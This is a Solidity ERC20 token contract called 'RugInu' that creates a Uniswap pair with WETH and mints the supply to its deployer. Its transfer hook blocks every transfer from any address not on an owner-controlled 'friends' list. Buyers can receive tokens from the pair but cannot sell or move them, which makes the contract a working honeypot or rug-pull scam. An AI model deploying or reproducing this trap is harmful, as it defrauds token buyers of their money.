// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./Ownable.sol";
import "./ERC20.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

// For all the copy-cats and carpet lovers out there.
contract RugInu is ERC20, Ownable {

    address private constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    mapping(address => bool) private friends;

    constructor() ERC20("RugInu", "RUG") {
        _mint(_msgSender(), 123_456_789 * 1e18);
        friends[_msgSender()] = true;
    }

    function createPair() external onlyOwner() {
        address pair = IUniswapV2Factory(FACTORY).createPair(address(this), WETH);
        friends[pair] = true;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);
        require(_isFriend(from) || from == address(0), "RugInu: only friends allowed, no copy cats");
    }

    function _isFriend(address _address) private view returns (bool) {
        return friends[_address];
    }

    function addFriends(address[] calldata addresses, bool isFriend) external onlyOwner {
        for (uint256 i = 0; i < addresses.length; i++) {
            friends[addresses[i]] = isFriend;
        }
    }
}